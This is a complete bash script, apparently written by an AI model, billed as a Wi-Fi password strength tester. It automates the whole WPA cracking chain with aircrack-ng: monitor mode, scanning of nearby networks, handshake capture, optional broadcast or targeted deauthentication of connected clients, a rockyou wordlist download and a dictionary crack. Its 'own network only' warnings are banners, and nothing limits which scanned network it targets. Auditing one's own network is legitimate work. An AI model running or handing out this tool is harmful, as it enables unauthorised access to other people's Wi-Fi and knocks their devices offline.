#!/bin/bash

# --- // WiFi Password Strength Tester using aircrack-ng // ---
# --- //          !!! FOR EDUCATIONAL/TESTING PURPOSES ONLY !!!           ---
# --- //          !!! ONLY USE ON NETWORKS YOU OWN OR HAVE PERMISSION !!! ---

# --- // Configuration & Variables // ---
SCRIPT_VERSION="1.1"
SCRIPT_AUTHOR="AI Assistant (Gemini)"
DEFAULT_WORDLIST_URL="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
DEFAULT_WORDLIST_PATH="/usr/share/wordlists/rockyou.txt" # Common path, adjust if needed
CAPTURE_DIR="./wifi_captures" # Directory to save capture files
TEMP_PREFIX="wifi_test_temp_" # Prefix for temporary files

# --- // Colors // ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# --- // Global Variables // ---
selected_iface=""
monitor_iface=""
original_iface_name=""
target_bssid=""
target_essid=""
target_channel=""
capture_file_base=""
capture_file_cap=""
wordlist_path=""
network_manager_service=""
skip_monitor_mode="no"
existing_cap_file=""

# --- // Functions // ---

# Function to print messages
print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
print_prompt() { echo -e "${PURPLE}[PROMPT]${NC} $1"; }
print_critical() { echo -e "${RED}[CRITICAL]${NC} $1"; }

# Function to clean up temporary files and monitor mode
cleanup() {
    print_info "Initiating cleanup..."
    # Stop monitor mode if active
    if [[ -n "$monitor_iface" ]]; then
        print_info "Stopping monitor mode on ${YELLOW}$monitor_iface${NC}..."
        airmon-ng stop "$monitor_iface" > /dev/null 2>&1
        # Sometimes monitor mode creates a new iface, sometimes it renames original
        # Try bringing original back up if needed (best effort)
        if [[ -n "$original_iface_name" && "$original_iface_name" != "$monitor_iface" ]]; then
             ip link set "$original_iface_name" up > /dev/null 2>&1
        fi
         monitor_iface="" # Clear monitor interface variable
    fi

    # Restart Network Manager (best effort)
    if [[ -n "$network_manager_service" ]]; then
        print_info "Attempting to restart network services ($network_manager_service)..."
        systemctl restart "$network_manager_service" > /dev/null 2>&1
        if [[ $? -ne 0 ]]; then
             print_warning "Failed to automatically restart network service. You might need to do it manually (e.g., 'sudo systemctl restart NetworkManager')."
        else
            print_success "Network services likely restarted."
        fi
    else
         print_warning "Could not determine network manager service. You might need to manually reconnect to Wi-Fi."
    fi

    # Remove specific temporary files
    print_info "Removing temporary scan files..."
    rm -f ${TEMP_PREFIX}scan*

    # Optional: Remove capture files? Ask user? For now, keep them.
    # print_info "Capture file saved as ${capture_file_cap}"

    print_success "Cleanup finished."
}

# Trap Ctrl+C and errors for cleanup
trap ctrl_c INT TERM ERR

ctrl_c() {
    print_warning "\nCtrl+C detected. Exiting and cleaning up..."
    # Kill background processes (airodump, etc.)
    if jobs -p | grep . > /dev/null; then
        print_info "Stopping background capture processes..."
        kill $(jobs -p) > /dev/null 2>&1
    fi
    cleanup
    exit 1
}

# Function to check for root privileges
check_root() {
    print_info "Checking for root privileges..."
    if [[ "$EUID" -ne 0 ]]; then
        print_critical "This script requires root privileges to run."
        print_info "Please run using 'sudo $0'"
        exit 1
    fi
    print_success "Root privileges detected."
}

# Function to detect package manager and network service
detect_system() {
    print_info "Detecting package manager and network service..."
    if command -v apt-get &> /dev/null; then
        PKG_MANAGER="apt-get"
        INSTALL_CMD="sudo apt-get install -y"
        UPDATE_CMD="sudo apt-get update"
        network_manager_service="NetworkManager.service" # Common on Debian/Ubuntu
    elif command -v dnf &> /dev/null; then
        PKG_MANAGER="dnf"
        INSTALL_CMD="sudo dnf install -y"
        UPDATE_CMD="" # dnf usually doesn't need separate update before install
        network_manager_service="NetworkManager.service" # Common on Fedora
    elif command -v yum &> /dev/null; then
        PKG_MANAGER="yum"
        INSTALL_CMD="sudo yum install -y"
        UPDATE_CMD=""
        network_manager_service="NetworkManager.service" # Common on CentOS/RHEL
    elif command -v pacman &> /dev/null; then
        PKG_MANAGER="pacman"
        INSTALL_CMD="sudo pacman -S --noconfirm"
        UPDATE_CMD="sudo pacman -Sy"
        network_manager_service="NetworkManager.service" # Common on Arch
    else
        PKG_MANAGER="unknown"
        print_warning "Could not detect a common package manager (apt, dnf, yum, pacman)."
    fi
    print_info "Detected Package Manager: ${YELLOW}$PKG_MANAGER${NC}"

    # Refine network manager detection (simple check)
     if ! systemctl list-units --full -all | grep -q "$network_manager_service"; then
         if systemctl list-units --full -all | grep -q "networking.service"; then
              network_manager_service="networking.service"
         elif systemctl list-units --full -all | grep -q "wicd.service"; then
             network_manager_service="wicd.service"
         else
             network_manager_service="" # Fallback
             print_warning "Could not reliably detect network management service."
         fi
     fi
    print_info "Detected Network Service: ${YELLOW}${network_manager_service:-'Not Found'}${NC}"

}

# Function to check and install dependencies
check_dependencies() {
    print_info "Checking dependencies..."
    local missing_deps=()
    local deps=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "iw")

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            print_warning "Dependency '${YELLOW}$dep${NC}' not found."
            missing_deps+=("$dep")
        else
            print_success "Dependency '${GREEN}$dep${NC}' found."
        fi
    done

    if [[ ${#missing_deps[@]} -ne 0 ]]; then
        print_warning "Some dependencies are missing: ${YELLOW}${missing_deps[*]}${NC}"
        if [[ "$PKG_MANAGER" != "unknown" ]]; then
            print_prompt "Attempt to install missing dependencies using $PKG_MANAGER? (Requires internet) (y/n):"
            read -r install_confirm
            if [[ "$install_confirm" =~ ^[Yy]$ ]]; then
                print_info "Attempting installation..."
                # Determine package name(s) - often 'aircrack-ng' provides all air* tools
                # 'iw' is usually separate
                local pkgs_to_install=()
                [[ " ${missing_deps[*]} " =~ " air" ]] && pkgs_to_install+=("aircrack-ng")
                [[ " ${missing_deps[*]} " =~ " iw" ]] && pkgs_to_install+=("iw")

                if [[ -n "$UPDATE_CMD" ]]; then
                    print_info "Running package list update..."
                    $UPDATE_CMD
                fi
                print_info "Running install command: ${CYAN}$INSTALL_CMD ${pkgs_to_install[*]}${NC}"
                if $INSTALL_CMD "${pkgs_to_install[@]}"; then
                    print_success "Dependencies hopefully installed."
                    # Re-check after installation attempt
                    local still_missing=()
                    for dep in "${missing_deps[@]}"; do
                        if ! command -v "$dep" &> /dev/null; then
                            still_missing+=("$dep")
                        fi
                    done
                    if [[ ${#still_missing[@]} -ne 0 ]]; then
                        print_error "Failed to install: ${RED}${still_missing[*]}${NC}"
                        print_critical "Please install them manually and re-run the script."
                        exit 1
                    else
                         print_success "All dependencies seem to be installed now."
                    fi
                else
                    print_error "Installation failed using $PKG_MANAGER."
                    print_critical "Please install ${YELLOW}${missing_deps[*]}${NC} manually and re-run the script."
                    exit 1
                fi
            else
                print_critical "Cannot proceed without dependencies. Please install them manually."
                exit 1
            fi
        else
            print_critical "Cannot automatically install dependencies (unknown package manager)."
            print_critical "Please install ${YELLOW}${missing_deps[*]}${NC} manually and re-run the script."
            exit 1
        fi
    else
        print_success "All dependencies are satisfied."
    fi
}

# Function to select wireless interface
select_interface() {
    print_info "Detecting wireless interfaces..."
    local interfaces=($(iw dev | grep -oP 'Interface \K\S+')) # More reliable than airmon-ng for initial list

    if [[ ${#interfaces[@]} -eq 0 ]]; then
        print_critical "No wireless interfaces found. Ensure your drivers are loaded and the device is enabled."
        # Alternative check if iw dev failed for some reason
        interfaces=($(ip -o link show | awk -F': ' '$3 ~ /wlan|wifi|wlp/ {print $2}'))
         if [[ ${#interfaces[@]} -eq 0 ]]; then
             print_critical "Still no wireless interfaces found using 'ip link'. Exiting."
             exit 1
         else
              print_warning "Used 'ip link' as fallback for interface detection."
         fi
    fi

    print_info "Available wireless interfaces:"
    local i=1
    for iface in "${interfaces[@]}"; do
        echo -e "  ${CYAN}$i)${NC} $iface"
        i=$((i+1))
    done

    while true; do
        print_prompt "Enter the number of the interface you want to use:"
        read -r choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le ${#interfaces[@]} ]; then
            selected_iface="${interfaces[$((choice-1))]}"
            original_iface_name="$selected_iface" # Store the original name
            print_success "Selected interface: ${GREEN}$selected_iface${NC}"
            break
        else
            print_error "Invalid choice. Please enter a number between 1 and ${#interfaces[@]}."
        fi
    done
}

# Function to enable monitor mode
enable_monitor_mode() {
    if [[ "$skip_monitor_mode" == "yes" ]]; then
        print_info "Skipping monitor mode enablement as requested."
        return 0
    fi

    print_info "Attempting to put ${YELLOW}$selected_iface${NC} into monitor mode..."
    # Check for potentially interfering processes
    airmon-ng check "$selected_iface"
    if [[ $? -ne 0 ]]; then
        print_warning "Potential interfering processes detected."
        print_prompt "Attempt to kill them? (Recommended, but use with caution) (y/n):"
        read -r kill_confirm
        if [[ "$kill_confirm" =~ ^[Yy]$ ]]; then
            print_info "Attempting to kill interfering processes..."
            if ! airmon-ng check kill; then
                 print_error "Failed to kill processes automatically. Monitor mode might fail."
                 print_prompt "Continue anyway? (y/n):"
                 read -r continue_confirm
                 if [[ ! "$continue_confirm" =~ ^[Yy]$ ]]; then
                     print_critical "Aborting."
                     cleanup # Run cleanup before exiting
                     exit 1
                 fi
            else
                 print_success "Processes hopefully killed."
            fi
        fi
    fi

    # Start monitor mode
    print_info "Starting monitor mode on ${YELLOW}$selected_iface${NC}..."
    # Capture output to find the monitor interface name
    local airmon_output
    airmon_output=$(airmon-ng start "$selected_iface" 2>&1)
    echo "$airmon_output" # Show output to user

    # Try to parse the new interface name
    monitor_iface=$(echo "$airmon_output" | grep -oP 'monitor mode enabled on \K\S+' | tr -d '()')

    # Fallback detection if parsing fails (common pattern: monX or ifacemon)
    if [[ -z "$monitor_iface" ]]; then
        sleep 2 # Give it a moment to settle
        local possible_mon_ifaces=($(iw dev | grep -oP 'Interface \K\S+' | grep -E "mon$|${selected_iface}mon"))
         if [[ ${#possible_mon_ifaces[@]} -eq 1 ]]; then
             monitor_iface="${possible_mon_ifaces[0]}"
             print_warning "Detected monitor interface as ${YELLOW}$monitor_iface${NC} using fallback."
         elif [[ ${#possible_mon_ifaces[@]} -gt 1 ]]; then
              print_warning "Multiple potential monitor interfaces found: ${possible_mon_ifaces[*]}. Using the first one: ${possible_mon_ifaces[0]}"
              monitor_iface="${possible_mon_ifaces[0]}"
         fi
    fi

    if [[ -z "$monitor_iface" ]] || ! ip link show "$monitor_iface" &> /dev/null; then
        print_error "Failed to enable monitor mode or detect monitor interface."
        print_info "Troubleshooting suggestions:"
        print_info " - Ensure drivers support monitor mode."
        print_info " - Try running 'airmon-ng check kill' manually before starting."
        print_info " - Try starting monitor mode manually: 'sudo airmon-ng start $selected_iface'"
        cleanup
        exit 1
    fi

    print_success "Monitor mode enabled on: ${GREEN}$monitor_iface${NC}"
    # Important: Update selected_iface to the monitor interface for subsequent commands
    selected_iface="$monitor_iface"
    sleep 1 # Small pause
}

# Function to scan for networks
scan_networks() {
    print_info "Scanning for Wi-Fi networks using ${YELLOW}$selected_iface${NC}..."
    print_info "This will take about 15-20 seconds. Press Ctrl+C to stop early (might miss networks)."
    local scan_file="${TEMP_PREFIX}scan"
    # Run airodump-ng in the background, capture output, and kill after timeout
    airodump-ng --write "$scan_file" --output-format csv,pcap --write-interval 5 "$selected_iface" > /dev/null 2>&1 &
    local airodump_pid=$!

    # Wait for a bit, check if process is still running
    sleep 18
    if kill -0 $airodump_pid > /dev/null 2>&1; then
        kill $airodump_pid
        wait $airodump_pid 2>/dev/null # Suppress "Terminated" message
    else
        print_warning "Airodump process finished unexpectedly or was stopped early."
    fi
    sleep 1 # Ensure file is written

    local csv_file="${scan_file}-01.csv"
    if [[ ! -f "$csv_file" ]]; then
        print_error "Scan output file ($csv_file) not found. Scan failed."
        cleanup
        exit 1
    fi

    print_success "Scan complete. Processing results..."

    # Process the CSV file to show Access Points
    local ap_list=()
    local line_num=0
    # Read the CSV file, skipping the header and station sections
    while IFS=, read -r bssid first_time last_time channel speed privacy cipher auth power beacons iv len calc_len essid key; do
        ((line_num++))
        # APs are listed between the header line and the line starting with "Station MAC"
        if [[ "$bssid" == "BSSID" ]] || [[ "$bssid" == "Station MAC" ]]; then
            [[ "$bssid" == "Station MAC" ]] && break # Stop when we hit the station list
            continue
        fi
        # Trim whitespace from ESSID
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        # Skip hidden networks for selection simplicity (or show them?)
        if [[ -z "$essid" ]] || [[ "$essid" == "<length: "* ]]; then
            essid="<Hidden Network>"
        fi
        # Filter for WPA/WPA2 (can adjust if testing WEP etc.)
        if [[ "$privacy" == *"WPA"* ]]; then
             # Format: BSSID|Channel|ESSID
             ap_list+=("$bssid|$channel|$essid")
        fi
    done < <(tail -n +2 "$csv_file") # Skip header row

    if [[ ${#ap_list[@]} -eq 0 ]]; then
        print_error "No WPA/WPA2 networks found during scan."
        cleanup
        exit 1
    fi

    print_info "Found WPA/WPA2 Access Points:"
    echo -e " ${CYAN}Num) BSSID              CH   ESSID${NC}"
    echo "-----------------------------------------------------"
    local i=1
    for entry in "${ap_list[@]}"; do
        local bssid=$(echo "$entry" | cut -d'|' -f1)
        local chan=$(echo "$entry" | cut -d'|' -f2 | xargs) # Trim whitespace
        local essid=$(echo "$entry" | cut -d'|' -f3)
        printf " %-3s %-18s %-4s %s\n" "$i)" "$bssid" "$chan" "$essid"
        i=$((i+1))
    done
    echo "-----------------------------------------------------"

    # Prompt user to select target
    while true; do
        print_prompt "Enter the number of the network you want to test (your own network):"
        read -r choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le ${#ap_list[@]} ]; then
            local selected_entry="${ap_list[$((choice-1))]}"
            target_bssid=$(echo "$selected_entry" | cut -d'|' -f1)
            target_channel=$(echo "$selected_entry" | cut -d'|' -f2 | xargs)
            target_essid=$(echo "$selected_entry" | cut -d'|' -f3)
            # Sanitize ESSID for filename (remove spaces, special chars)
            local sanitized_essid=$(echo "$target_essid" | sed 's/[^a-zA-Z0-9_-]/_/g')
            local current_date=$(date +"%Y%m%d_%H%M%S")
            # Ensure capture directory exists
            mkdir -p "$CAPTURE_DIR"
            capture_file_base="${CAPTURE_DIR}/${sanitized_essid}_${target_bssid//:/}_${current_date}"

            print_success "Selected Target:"
            echo -e "  ESSID:   ${GREEN}$target_essid${NC}"
            echo -e "  BSSID:   ${GREEN}$target_bssid${NC}"
            echo -e "  Channel: ${GREEN}$target_channel${NC}"
            echo -e "  Capture file base: ${GREEN}$capture_file_base${NC}"
            break
        else
            print_error "Invalid choice. Please enter a number between 1 and ${#ap_list[@]}."
        fi
    done
}

# Function to capture handshake
capture_handshake() {
    print_info "Starting packet capture for ${YELLOW}$target_essid${NC} (BSSID: $target_bssid) on channel $target_channel."
    print_info "Capture file: ${CYAN}${capture_file_base}-01.cap${NC}"
    print_warning "You now need to get a device (like your phone or laptop) to connect OR reconnect to the '${YELLOW}$target_essid${NC}' network."
    print_warning "The script will watch for the WPA handshake."
    print_info "(Press Ctrl+C to abort capture)"

    # Start airodump-ng focused on the target
    airodump-ng --bssid "$target_bssid" --channel "$target_channel" --write "$capture_file_base" --output-format pcap "$selected_iface" &
    local airodump_pid=$!
    # Give it a moment to start
    sleep 3

    # Option for Deauthentication Attack
    local client_list=()
    print_prompt "Do you want to try a deauthentication attack to speed up handshake capture?"
    print_warning "(This disconnects clients temporarily. Use responsibly!) (y/n):"
    read -r deauth_confirm
    if [[ "$deauth_confirm" =~ ^[Yy]$ ]]; then
        print_info "Looking for connected clients (may take a few seconds)..."
        # Let airodump run a bit longer to find clients
        sleep 10
        # Check the main capture file for clients associated with the BSSID
        # Need hcxpcaptool or tshark for reliable client listing from pcap, which adds dependencies.
        # Let's try a simpler approach: ask user to observe airodump output (less automated but fewer deps)
        print_warning "Please observe the 'airodump-ng' window that was just started."
        print_warning "Look under the 'STATION' column for MAC addresses associated with BSSID ${YELLOW}$target_bssid${NC}."
        print_prompt "Enter the MAC address of a client to deauth (or 'all' for broadcast, or 'none'):"
        read -r client_mac

        if [[ -n "$client_mac" ]] && [[ "$client_mac" != "none" ]]; then
            local deauth_count=5 # Number of deauth packets to send
             if [[ "$client_mac" == "all" ]]; then
                 print_info "Sending ${YELLOW}$deauth_count${NC} broadcast deauthentication packets to BSSID ${YELLOW}$target_bssid${NC}..."
                 aireplay-ng --deauth "$deauth_count" -a "$target_bssid" "$selected_iface"
             else
                 # Basic MAC address validation
                 if [[ "$client_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                     print_info "Sending ${YELLOW}$deauth_count${NC} deauthentication packets to client ${YELLOW}$client_mac${NC} on BSSID ${YELLOW}$target_bssid${NC}..."
                     aireplay-ng --deauth "$deauth_count" -a "$target_bssid" -c "$client_mac" "$selected_iface"
                 else
                     print_error "Invalid MAC address format. Skipping deauthentication."
                 fi
             fi
        else
            print_info "Skipping deauthentication attack."
        fi
    fi

    # Monitor for handshake
    print_info "Waiting for WPA Handshake... (Keep an eye on the airodump-ng window's top right corner)"
    print_info "Check the capture file: ${CYAN}${capture_file_base}-01.cap${NC}"
    local handshake_found=0
    local check_interval=15 # Check every 15 seconds
    local max_wait_time=300 # Maximum wait time in seconds (5 minutes)
    local waited_time=0

    while [[ $handshake_found -eq 0 ]] && [[ $waited_time -lt $max_wait_time ]]; do
        sleep $check_interval
        waited_time=$((waited_time + check_interval))
        print_info "Checking for handshake in capture file... (${waited_time}s / ${max_wait_time}s)"

        # Use aircrack-ng to check for handshake (-J is preferred for hccapx, but let's use basic check)
        # We need to check the *most recent* cap file airodump created
        capture_file_cap=$(ls -t "${capture_file_base}"*.cap 2>/dev/null | head -n 1)
        if [[ -n "$capture_file_cap" ]] && [[ -s "$capture_file_cap" ]]; then
            if aircrack-ng "$capture_file_cap" 2>&1 | grep -q -E '[1-9]\s+WPA\s+\([0-9]+\s+handshake' ; then
                print_success "WPA Handshake captured!"
                handshake_found=1
                break
            fi
            # Optional: Try hcxpcaptool if available (more robust check)
            if command -v hcxpcaptool &> /dev/null; then
                 if hcxpcaptool -z "${capture_file_base}.hccapx" "$capture_file_cap" > /dev/null 2>&1 && [[ -s "${capture_file_base}.hccapx" ]]; then
                      print_success "WPA Handshake captured! (Verified with hcxpcaptool)"
                      handshake_found=1
                      rm "${capture_file_base}.hccapx" # Remove the temp hccapx file
                      break
                 fi
            fi
        fi
        print_info "Handshake not yet detected. Ensure a device is connecting/reconnecting."

        # Check if airodump is still running
        if ! kill -0 $airodump_pid > /dev/null 2>&1; then
            print_error "airodump-ng process stopped unexpectedly!"
            break # Exit the loop
        fi
    done

    # Stop airodump-ng
    print_info "Stopping capture process (PID: $airodump_pid)..."
    kill $airodump_pid
    wait $airodump_pid 2>/dev/null
    sleep 1

    # Final check on the latest capture file
    capture_file_cap=$(ls -t "${capture_file_base}"*.cap 2>/dev/null | head -n 1)
    if [[ $handshake_found -eq 0 ]]; then
        # Check one last time after stopping
        if [[ -n "$capture_file_cap" ]] && [[ -s "$capture_file_cap" ]]; then
             if aircrack-ng "$capture_file_cap" 2>&1 | grep -q -E '[1-9]\s+WPA\s+\([0-9]+\s+handshake' ; then
                 print_success "WPA Handshake found after stopping capture!"
                 handshake_found=1
            fi
        fi
    fi


    if [[ $handshake_found -eq 0 ]]; then
        print_error "Failed to capture WPA handshake within the time limit (${max_wait_time}s)."
        print_info "Try running the capture again, ensuring devices connect/reconnect, or try the deauth option."
        print_info "Capture file saved as: ${CYAN}${capture_file_cap:-'No file generated'}${NC}"
        cleanup
        exit 1
    fi

     print_success "Handshake capture successful. File: ${GREEN}$capture_file_cap${NC}"
}

# Function to select wordlist
select_wordlist() {
    print_info "Password cracking requires a wordlist file."

    # Check for default rockyou.txt
    local rockyou_found="no"
    if [[ -f "$DEFAULT_WORDLIST_PATH" ]]; then
        print_info "Found common wordlist: ${YELLOW}$DEFAULT_WORDLIST_PATH${NC}"
        rockyou_found="yes"
    elif [[ -f "rockyou.txt" ]]; then
         print_info "Found 'rockyou.txt' in the current directory."
         DEFAULT_WORDLIST_PATH="./rockyou.txt"
         rockyou_found="yes"
    else
         # Check if it exists but needs unzipping (common case)
         if [[ -f "${DEFAULT_WORDLIST_PATH}.gz" ]]; then
             print_prompt "Found gzipped wordlist: ${YELLOW}${DEFAULT_WORDLIST_PATH}.gz${NC}. Unzip it? (y/n)"
             read -r unzip_confirm
             if [[ "$unzip_confirm" =~ ^[Yy]$ ]]; then
                  print_info "Unzipping ${DEFAULT_WORDLIST_PATH}.gz..."
                  if gunzip -k "${DEFAULT_WORDLIST_PATH}.gz"; then # -k keeps the original .gz
                     print_success "Unzipped successfully."
                     rockyou_found="yes"
                  else
                     print_error "Failed to unzip. Check permissions or disk space."
                  fi
             fi
         fi
    fi


    while true; do
        if [[ "$rockyou_found" == "yes" ]]; then
             print_prompt "Enter the path to your wordlist file, or press Enter to use '${YELLOW}$DEFAULT_WORDLIST_PATH${NC}', or type 'download' to get rockyou.txt:"
             read -r input_path
             if [[ -z "$input_path" ]]; then
                 wordlist_path="$DEFAULT_WORDLIST_PATH"
             elif [[ "$input_path" == "download" ]]; then
                  wordlist_path="" # Signal download
             else
                 wordlist_path="$input_path"
             fi
        else
             print_prompt "Enter the path to your wordlist file, or type 'download' to get rockyou.txt:"
             read -r input_path
             if [[ "$input_path" == "download" ]]; then
                 wordlist_path="" # Signal download
             else
                 wordlist_path="$input_path"
             fi
        fi

        if [[ -z "$wordlist_path" ]]; then # Download case
             print_info "Attempting to download rockyou.txt..."
             if command -v curl &> /dev/null; then
                 if curl -L -o rockyou.txt "$DEFAULT_WORDLIST_URL"; then
                     print_success "Downloaded rockyou.txt to current directory."
                     # Check if it downloaded as .gz implicitly (sometimes happens)
                     if file rockyou.txt | grep -q gzip; then
                         print_info "Downloaded file seems gzipped. Renaming and unzipping..."
                         mv rockyou.txt rockyou.txt.gz
                         if gunzip rockyou.txt.gz; then
                              wordlist_path="rockyou.txt"
                         else
                              print_error "Failed to unzip downloaded file."
                              continue # Ask again
                         fi
                     else
                         wordlist_path="rockyou.txt"
                     fi
                 else
                      print_error "Download failed using curl."
                      continue # Ask again
                 fi
             elif command -v wget &> /dev/null; then
                 if wget -O rockyou.txt "$DEFAULT_WORDLIST_URL"; then
                     print_success "Downloaded rockyou.txt to current directory."
                     # Check if it downloaded as .gz implicitly
                     if file rockyou.txt | grep -q gzip; then
                         print_info "Downloaded file seems gzipped. Renaming and unzipping..."
                         mv rockyou.txt rockyou.txt.gz
                         if gunzip rockyou.txt.gz; then
                              wordlist_path="rockyou.txt"
                         else
                              print_error "Failed to unzip downloaded file."
                              continue # Ask again
                         fi
                     else
                         wordlist_path="rockyou.txt"
                     fi
                 else
                     print_error "Download failed using wget."
                     continue # Ask again
                 fi
             else
                 print_error "Cannot download wordlist. Neither 'curl' nor 'wget' found."
                 print_info "Please provide the path to an existing wordlist."
                 continue # Ask again
             fi
        fi


        if [[ -f "$wordlist_path" ]]; then
            if [[ -r "$wordlist_path" ]]; then
                print_success "Using wordlist: ${GREEN}$wordlist_path${NC}"
                break
            else
                print_error "Wordlist file exists but is not readable. Check permissions."
            fi
        else
            print_error "Wordlist file not found at: ${RED}$wordlist_path${NC}"
            # Reset rockyou_found if user provided a bad path, so download prompt comes back correctly
            [[ "$wordlist_path" == "$DEFAULT_WORDLIST_PATH" ]] && rockyou_found="no"
        fi
    done
}

# Function to crack password
crack_password() {
    print_info "Starting password cracking process..."
    print_info "Target ESSID: ${YELLOW}$target_essid${NC}"
    print_info "Capture File: ${YELLOW}$capture_file_cap${NC}"
    print_info "Wordlist:     ${YELLOW}$wordlist_path${NC}"
    print_warning "This can take a VERY long time depending on password complexity and wordlist size."
    print_info "Press Ctrl+C to abort cracking."

    # Execute aircrack-ng
    aircrack-ng -a 2 -w "$wordlist_path" -b "$target_bssid" "$capture_file_cap"
    local crack_status=$?

    echo # Add a newline for clarity after aircrack output

    if [[ $crack_status -eq 0 ]]; then
         # Aircrack-ng usually prints the key itself on success and exits 0
         # We can parse its output if needed, but let's assume user sees it.
         print_success "Password cracking finished. Check the output above for the key."
         print_warning "Consider using a stronger, more complex password if it was found easily!"
         password_strength_advice "found"
    else
         print_error "Password not found using the provided wordlist."
         print_info "Possible reasons:"
         print_info " - Password is not in the wordlist."
         print_info " - Password is too complex for dictionary attacks."
         print_info " - Handshake capture might have been corrupted (less likely if verified)."
         print_info " - Incorrect BSSID specified (if manually entered)."
         password_strength_advice "not_found"
    fi
}

# Function to provide password strength advice
password_strength_advice() {
    local result=$1 # "found" or "not_found"

    echo # Newline for spacing
    print_info "--- Password Strength Assessment ---"
    if [[ "$result" == "found" ]]; then
        print_warning "Your Wi-Fi password was found using the dictionary attack."
        print_warning "Recommendation: CHANGE YOUR PASSWORD IMMEDIATELY."
        print_warning "Use a strong password:"
        echo -e "  - At least ${GREEN}12-16 characters${NC} long (more is better)."
        echo -e "  - Mix of ${GREEN}uppercase letters${NC}, ${GREEN}lowercase letters${NC}, ${GREEN}numbers${NC}, and ${GREEN}symbols${NC} (@, #, $, %, etc.)."
        echo -e "  - Avoid common words, names, dates, or easily guessable patterns."
        echo -e "  - Consider using a ${GREEN}passphrase${NC} (multiple random words strung together)."
        echo -e "  - Ensure you are using ${GREEN}WPA2${NC} or ${GREEN}WPA3${NC} security (WPA3 is strongest)."
    else
        print_success "Your Wi-Fi password was NOT found with the provided wordlist (${wordlist_path})."
        print_info "This suggests your password:"
        echo -e "  - Is likely ${GREEN}not a common word or phrase${NC} found in that specific list."
        echo -e "  - May be reasonably ${GREEN}strong against dictionary attacks${NC}."
        print_info "However, this doesn't guarantee it's uncrackable. Stronger wordlists or brute-force attacks could potentially find it (though taking much longer)."
        print_info "Recommendations for maintaining security:"
        echo -e "  - Keep using a strong, unique password."
        echo -e "  - Ensure your router uses ${GREEN}WPA2${NC} or ideally ${GREEN}WPA3${NC} encryption."
        echo -e "  - Keep your router's firmware updated."
        echo -e "  - Consider disabling WPS (Wi-Fi Protected Setup) if not needed, as it can be a vulnerability."
    fi
    echo "------------------------------------"
}

# Function to handle "Crack Existing Capture" mode
crack_existing_capture() {
    print_info "--- Crack Existing Capture File Mode ---"
    skip_monitor_mode="yes" # Ensure we don't mess with the interface

    # Get Capture File Path
    while true; do
        print_prompt "Enter the full path to the .cap file containing the WPA handshake:"
        read -r existing_cap_file
        if [[ -f "$existing_cap_file" ]] && [[ "$existing_cap_file" == *.cap ]]; then
            if [[ -r "$existing_cap_file" ]]; then
                 print_success "Using capture file: ${GREEN}$existing_cap_file${NC}"
                 capture_file_cap="$existing_cap_file" # Set the global variable
                 break
            else
                print_error "Capture file exists but is not readable. Check permissions."
            fi
        else
            print_error "File not found or is not a .cap file: ${RED}$existing_cap_file${NC}"
        fi
    done

    # Get BSSID (needed by aircrack-ng)
    while true; do
         print_prompt "Enter the BSSID (MAC Address) of the target Access Point associated with this capture:"
         read -r target_bssid
         if [[ "$target_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
             print_success "Using BSSID: ${GREEN}$target_bssid${NC}"
             # Try to infer ESSID from capture file name if possible (optional)
             local filename=$(basename "$capture_file_cap")
             target_essid=$(echo "$filename" | cut -d'_' -f1) # Simple guess
             print_info "(Inferred ESSID from filename: ${YELLOW}$target_essid${NC} - used for display only)"
             break
         else
             print_error "Invalid BSSID format. Use XX:XX:XX:XX:XX:XX format."
         fi
    done

    # Get Wordlist
    select_wordlist

    # Crack Password
    crack_password

    # No cleanup needed for monitor mode in this path
    print_info "Exiting 'Crack Existing Capture' mode."
}

# --- // Main Script Logic // ---

clear
echo -e "${CYAN}--- Wi-Fi Password Strength Tester (v$SCRIPT_VERSION) ---${NC}"
echo -e "${YELLOW}Author: $SCRIPT_AUTHOR${NC}"
echo -e "${RED}!!! USE RESPONSIBLY AND LEGALLY !!!${NC}"
echo

# Initial Checks
check_root
detect_system
check_dependencies

# Main Menu
while true; do
    echo -e "\n${PURPLE}--- Main Menu ---${NC}"
    echo -e " ${CYAN}1)${NC} Full Test (Enable Monitor Mode, Scan, Capture, Crack)"
    echo -e " ${CYAN}2)${NC} Crack Existing Capture File (Requires .cap file and BSSID)"
    echo -e " ${CYAN}3)${NC} Check/Re-install Dependencies"
    echo -e " ${CYAN}4)${NC} Exit"
    print_prompt "Choose an option:"
    read -r main_choice

    case $main_choice in
        1)
            print_info "Starting Full Test..."
            skip_monitor_mode="no" # Ensure monitor mode is used
            select_interface
            enable_monitor_mode
            scan_networks
            capture_handshake
            select_wordlist
            crack_password
            cleanup # Full cleanup after the process
            print_info "Full test process complete."
            ;;
        2)
            crack_existing_capture
            # Cleanup is skipped here as monitor mode wasn't used
            ;;
        3)
            check_dependencies
            ;;
        4)
            print_info "Exiting script."
            exit 0
            ;;
        *)
            print_error "Invalid choice. Please enter a number from 1 to 4."
            ;;
    esac

    print_prompt "Press Enter to return to the main menu..."
    read -r dummy
    clear
done

# Should not be reached, but include final cleanup just in case
cleanup
exit 0
